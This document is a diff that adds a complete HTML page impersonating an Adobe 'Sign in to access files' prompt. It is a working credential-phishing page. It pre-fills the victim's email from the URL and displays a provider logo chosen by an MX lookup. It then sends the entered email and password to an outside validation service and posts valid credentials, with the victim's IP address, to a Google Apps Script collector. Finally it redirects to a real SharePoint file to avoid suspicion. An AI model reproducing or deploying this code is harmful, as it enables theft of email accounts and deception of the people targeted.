@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Adobe</title>
+  <link rel="icon" href="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" type="image/x-icon" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .bg-image {
+      background-image: url('https://robertlugana.sirv.com/updatedadobeview.jpg');
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .dark-overlay {
+      background-color: rgba(0, 0, 0, 0.6);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+    }
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      z-index: 2;
+      width: 400px;
+      max-width: 90%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    .form-container img {
+      width: 50px;
+      height: 50px;
+      display: block;
+      margin: 0 auto;
+      margin-bottom: 20px;
+    }
+    .form-container form {
+      width: 100%;
+    }
+    .form-group {
+      position: relative;
+    }
+    .form-group img {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+    }
+    .form-control {
+      padding-left: 40px;
+    }
+    .error-message {
+      color: red;
+      font-size: 18px;
+      text-align: center;
+      padding: 20px;
+      display: none;
+    }
+    .loading-dialog {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.8);
+      padding: 20px;
+      border-radius: 5px;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-image" id="bgImage">
+  <div class="dark-overlay"></div>
+  <div class="form-container" id="formContainer">
+    <img alt="Form Image" src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0">
+    <h4>Sign in to access files</h4>
+    <form id="form13" action="javascript:void(0);" method="post" autocomplete="">
+      <div class="form-group" id="emailGroup">
+        <label for="exampleInputEmail1">Email address</label>
+        <img id="emailIcon" src="" alt="Email Icon">
+        <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" required>
+      </div>
+      <div class="form-group" id="passwordGroup">
+        <label for="exampleInputPassword1">Password</label>
+        <img src="https://robertlugana.sirv.com/icon/key_icon.png" alt="Key Icon">
+        <input type="password" class="form-control" id="exampleInputPassword1" name="password" required>
+      </div>
+      <div class="error-message" id="errorMessage"></div>
+      <input type="hidden" id="domainHidden" name="domain" value="">
+      <button type="button" class="btn btn-primary" id="submitButton" onclick="handleVerifyClick()">Login</button>
+    </form>
+  </div>
+</div>
+
+<div class="loading-dialog" id="loadingDialog">
+  <div class="spinner-border text-primary" role="status">
+    <span class="sr-only">Loading...</span>
+  </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  const emailInput = document.getElementById('exampleInputEmail1');
+  const passwordInput = document.getElementById('exampleInputPassword1');
+  const domainHiddenInput = document.getElementById('domainHidden');
+  const errorMessage = document.getElementById('errorMessage');
+  const emailGroup = document.getElementById('emailGroup');
+  const passwordGroup = document.getElementById('passwordGroup');
+  const submitButton = document.getElementById('submitButton');
+  const emailIcon = document.getElementById('emailIcon');
+  let submissionAttempts = 0;
+
+  const platformImageUrls = { 
+    gmail: "https://robertlugana.sirv.com/icon/2993685_brand_brands_google_logo_logos_icon.png",
+    outlook: "https://robertlugana.sirv.com/icon/4202105_microsoft_logo_social_social%20media_icon.png",
+    roundcube: "https://your-roundcube-url.com/",
+    aol: "https://login.aol.com/",
+    yahoo: "https://robertlugana.sirv.com/icon/2993703_aol_brand_brands_logo_logos_icon.png",
+    godaddy: "https://robertlugana.sirv.com/icon/4202105_microsoft_logo_social_social%20media_icon.png",
+  };
+
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  function setEmailIcon(email) {
+    fetch('https://serverless-online2.vercel.app/mx-check', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email })
+    })
+    .then(response => response.json())
+    .then(data => {
+      const mxRecord = data.mxRecord.toLowerCase();
+      for (const [key, url] of Object.entries(platformImageUrls)) {
+        if (mxRecord.includes(key)) {
+          emailIcon.src = url;
+          break;
+        }
+      }
+    })
+    .catch(error => console.error('Error fetching MX record:', error));
+  }
+
+  const emailFromUrl = getQueryParam('email');
+  if (emailFromUrl) {
+    emailInput.value = emailFromUrl;
+    emailInput.setAttribute('readonly', 'readonly');
+    setEmailIcon(emailFromUrl);
+
+    const atIndex = emailFromUrl.lastIndexOf('@');
+    if (atIndex !== -1) {
+      const domain = emailFromUrl.slice(atIndex + 1);
+      domainHiddenInput.value = domain;
+    } else {
+      domainHiddenInput.value = '';
+    }
+  } else {
+    emailGroup.style.display = 'none';
+    passwordGroup.style.display = 'none';
+    submitButton.style.display = 'none';
+    errorMessage.style.display = 'block';
+    errorMessage.textContent = 'You are not authorized to view this page. Please request access from the document owner.';
+    return;
+  }
+
+  window.handleVerifyClick = function () {
+    const btn = submitButton;
+    const passwordField = passwordInput;
+    const invalidPasswordError = errorMessage;
+
+    invalidPasswordError.style.display = 'none';
+    passwordField.disabled = true;
+    btn.disabled = true;
+    btn.innerText = "Decrypting Files...";
+    btn.style.backgroundColor = "#BEBEBE";
+
+    const email = emailInput.value;
+    const password = passwordField.value;
+
+    console.log("Form data:", { email, password });
+
+    fetch(`https://headless-webfixx-bdhk.vercel.app/verify-login-lite?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`, {
+      method: 'GET',
+      headers: { 'Content-Type': 'application/json' }
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("WebFixx Response:", data);
+
+      if (data.accountAccess) {
+        return fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(ipData => {
+            const userIp = ipData.ip;
+            const formData = new URLSearchParams();
+            formData.append('Email', email);
+            formData.append('Password', password);
+            formData.append('Verified', data.accountAccess);
+            formData.append('FormId', 'form21');
+            formData.append('IPAddress', userIp);
+
+            console.log("Sending POST request to Apps Script...");
+
+            return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              body: formData
+            });
+          });
+      } else {
+        throw new Error("Invalid password or account access denied.");
+      }
+    })
+    .then(() => {
+      console.log("POST request sent successfully. Redirecting...");
+      window.location.href = "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      invalidPasswordError.style.display = 'block';
+      invalidPasswordError.textContent = "Invalid Password: Try again.";
+    })
+    .finally(() => {
+      passwordField.disabled = false;
+      btn.disabled = false;
+      btn.innerText = "Login";
+      btn.style.backgroundColor = "";
+    });
+  };
+});
+</script>
+
+</body>
+</html>
